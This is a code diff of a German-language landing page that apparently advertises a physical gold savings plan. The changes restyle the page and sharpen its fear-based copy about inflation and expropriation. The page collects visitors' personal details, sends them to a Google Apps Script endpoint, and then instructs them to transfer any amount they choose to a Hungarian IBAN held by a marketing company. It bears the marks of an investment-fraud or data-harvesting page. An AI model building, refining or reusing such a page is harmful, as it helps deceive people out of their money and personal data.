@@ -8,23 +8,36 @@
 <style>
 body {
   font-family: Arial;
-  background: #f5f5f5;
+  background: #0f0f0f;
+  color: white;
   margin: 0;
 }
 
 .container {
   max-width: 500px;
   margin: auto;
-  background: white;
   padding: 20px;
 }
 
-h2 {
-  font-size: 22px;
+.card {
+  background: #1a1a1a;
+  padding: 20px;
+  border-radius: 10px;
+  margin-bottom: 20px;
 }
 
-p {
-  font-size: 15px;
+h1 {
+  font-size: 24px;
+}
+
+h2 {
+  font-size: 18px;
+  margin-top: 20px;
+}
+
+.highlight {
+  color: #d4af37;
+  font-weight: bold;
 }
 
 input {
@@ -32,20 +45,32 @@ input {
   padding: 12px;
   margin: 6px 0;
   font-size: 16px;
+  border-radius: 6px;
+  border: none;
 }
 
 button {
   padding: 14px;
   width: 100%;
   font-size: 16px;
-  background: black;
-  color: white;
+  background: #d4af37;
+  color: black;
   border: none;
-  margin-top: 8px;
+  margin-top: 10px;
+  border-radius: 6px;
+  font-weight: bold;
 }
 
 .copyBtn {
   background: #333;
+  color: white;
+}
+
+.idBox {
+  font-size: 20px;
+  font-weight: bold;
+  color: #d4af37;
+  margin: 10px 0;
 }
 
 #loader {
@@ -54,8 +79,8 @@ button {
 }
 
 .spinner {
-  border: 4px solid #eee;
-  border-top: 4px solid black;
+  border: 4px solid #333;
+  border-top: 4px solid #d4af37;
   border-radius: 50%;
   width: 40px;
   height: 40px;
@@ -66,13 +91,6 @@ button {
 @keyframes spin {
   100% { transform: rotate(360deg); }
 }
-
-.idBox {
-  font-weight: bold;
-  font-size: 18px;
-  margin: 10px 0;
-}
-
 </style>
 </head>
 
@@ -80,9 +98,15 @@ button {
 
 <div class="container">
 
-<h2>Schütze dein Vermögen bevor es zu spät ist</h2>
-<p><strong>Das System wird dich nicht retten.</strong><br>
-Sichere dich jetzt selbst ab – in unter 60 Sekunden.</p>
+<div class="card">
+<h1>Dein Geld verliert täglich an Wert</h1>
+<p>Inflation, Enteignung, Systemrisiken.</p>
+<p class="highlight">Du musst selbst handeln.</p>
+<p>Starte jetzt deinen physischen Gold-Sparplan – in unter 60 Sekunden.</p>
+</div>
+
+<div class="card">
+<h2>Deine Daten</h2>
 
 <form id="form">
 <input type="text" id="vorname" placeholder="Vorname" required>
@@ -99,28 +123,34 @@ Ich bestätige die Richtigkeit meiner Angaben
 
 <button>Jetzt absichern</button>
 </form>
+</div>
 
-<div id="loader">
+<div id="loader" class="card">
 <div class="spinner"></div>
-<p>Bitte nicht schließen – wird verarbeitet...</p>
-<p><strong>Du wirst gleich zur Zahlungsübersicht weitergeleitet</strong></p>
+<p>Verarbeitung läuft...</p>
+<p class="highlight">Du wirst gleich zur Zahlungsübersicht weitergeleitet</p>
 </div>
 
 <div id="result" style="display:none;">
 
-<h3>Deine persönliche ID</h3>
+<div class="card">
+<h2>Deine persönliche ID</h2>
 <div class="idBox" id="kundenId"></div>
+</div>
 
-<h3>Anleitung</h3>
+<div class="card">
+<h2>So richtest du deine Zahlung ein</h2>
 <p>
 1. Banking-App öffnen<br>
-2. Dauerauftrag oder Überweisung auswählen<br>
-3. IBAN kopieren und in die Banking-App einfügen<br>
-4. Zahlungsempfänger kopieren und einfügen<br>
-5. ID kopieren und als Verwendungszweck setzen
+2. Überweisung oder Dauerauftrag auswählen<br>
+3. IBAN kopieren und einfügen<br>
+4. Empfänger kopieren und einfügen<br>
+5. ID als Verwendungszweck eintragen
 </p>
+</div>
 
-<h3>Überweisungsdaten</h3>
+<div class="card">
+<h2>Überweisungsdaten</h2>
 
 <p><strong>IBAN</strong></p>
 <p id="iban">HU94120111480189343900200001</p>
@@ -130,11 +160,12 @@ Ich bestätige die Richtigkeit meiner Angaben
 <p id="empfaenger">M&M Marketing Kft</p>
 <button class="copyBtn" onclick="copyEmpfaenger()">Empfänger kopieren</button>
 
-<p><strong>Verwendungszweck (ID)</strong></p>
+<p><strong>Verwendungszweck</strong></p>
 <p id="vwz"></p>
 <button class="copyBtn" onclick="copyID()">ID kopieren</button>
 
 <p>Betrag frei wählbar</p>
+</div>
 
 </div>
 
@@ -142,7 +173,7 @@ Ich bestätige die Richtigkeit meiner Angaben
 
 <script>
 
-const scriptURL = "https://script.google.com/macros/s/AKfycbxgLEuiVpStD0TcPxuRY7wuNiv7V8yU2XkAaeeesCAiWKEgSXGc3AmIfBZzl5g4M-g3hg/exec";
+const scriptURL = "https://script.google.com/macros/s/AKfycbxLPl5mMATaW1RDBeghbD7DE8xFwkXFsUo4c0yOLul2JCLk5Fl-lIMl8oHjXXHlVvCWrw/exec";
 
 let isSubmitting = false;
 
